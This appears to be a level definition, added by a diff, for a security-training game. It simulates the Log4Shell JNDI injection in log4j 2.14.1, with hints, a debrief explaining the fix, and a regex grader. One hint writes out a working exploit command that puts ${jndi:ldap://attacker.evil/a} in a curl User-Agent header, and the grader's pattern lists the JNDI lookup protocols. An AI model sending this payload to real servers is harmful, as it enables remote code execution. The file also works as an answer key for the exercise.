@@ -1,0 +1,48 @@
+{
+  "id": "red-06-vulnerable-components",
+  "role": "red",
+  "order": 6,
+  "owasp_category": "A06:2021 - Vulnerable and Outdated Components",
+  "title": "JNDI Injection in an Outdated Logging Library",
+  "difficulty": 6,
+  "objective": "Trigger remote code execution via a known JNDI-injection flaw in the victim's outdated logging library.",
+  "briefing": "The victim server runs a logging library, version 2.14.1, that logs HTTP headers unsanitized - including the User-Agent header.",
+  "hints": [
+    "Check what's doing the logging, and what version it is - is it current?",
+    "That version has a well-known remote-code-execution flaw triggered by a lookup syntax in logged text.",
+    "curl http://{ip}/ -H \"User-Agent: ${jndi:ldap://attacker.evil/a}\""
+  ],
+  "debrief": "The logging library evaluates ${jndi:...} lookup syntax found inside any string it logs - including HTTP headers you fully control. By sending that syntax in the User-Agent header, the server made an outbound lookup to an attacker-controlled address, which in a real attack would return a malicious class to execute (this is the Log4Shell vulnerability, CVE-2021-44228). This is a Vulnerable and Outdated Component (OWASP A06:2021): the flaw wasn't in code the developers wrote, it was in a dependency they never updated. The fix is upgrading past the vulnerable version (and disabling JNDI lookups by default), plus a process for tracking and patching dependency CVEs instead of running whatever version was installed once.",
+  "victim_pc_initial_state": {
+    "files": ["/opt/app/lib/log4j-core-2.14.1.jar"],
+    "services": ["apache2"],
+    "logs": ["[BOOT] apache2 started", "[BOOT] logging library v2.14.1 loaded"]
+  },
+  "commands": {},
+  "command_patterns": [
+    {
+      "regex": "curl http://{ip}/ -H \"User-Agent: (?P<ua>[^\"]*)\"",
+      "cases": [
+        {
+          "checks": [
+            { "name": "regex", "args": { "field": "ua", "pattern": "\\$\\{jndi:(?P<proto>ldap|rmi|dns|ldaps|iiop|nis|corba)://[^}]+\\}", "flags": "i" } }
+          ],
+          "output": "HTTP/1.1 200 OK\n(server made outbound {proto} lookup while logging the request)",
+          "state_change": {
+            "logs_append": ["[VULN] log4j 2.14.1 evaluated JNDI lookup from User-Agent header - RCE triggered"]
+          },
+          "wins_level": true
+        },
+        {
+          "output": "HTTP/1.1 200 OK",
+          "state_change": {
+            "logs_append": ["[ACCESS] GET / - User-Agent: {ua}"]
+          },
+          "wins_level": false
+        }
+      ]
+    }
+  ],
+  "randomizable_fields": ["ip"],
+  "default_values": { "ip": "10.0.0.5" }
+}
